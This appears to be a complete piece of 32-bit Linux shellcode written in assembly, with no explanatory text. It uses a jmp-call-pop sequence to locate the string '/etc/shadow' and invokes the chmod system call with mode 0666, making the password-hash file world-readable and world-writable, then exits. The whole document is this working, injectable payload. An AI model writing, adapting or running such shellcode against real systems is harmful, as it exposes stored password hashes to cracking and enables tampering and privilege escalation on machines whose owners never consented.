global _start

section .text   

_start:	
	jmp filename

code:
	pop esi
	xor ecx,ecx
	mov byte  [esi + 11], cl
	lea ebx, [esi]
	mov word cx, 0x1b6
	xor eax,eax
	mov byte al,0xf
	int 0x80
	xor eax,eax
	inc eax
	int 0x80

filename:
	call code
	file db "/etc/shadow"
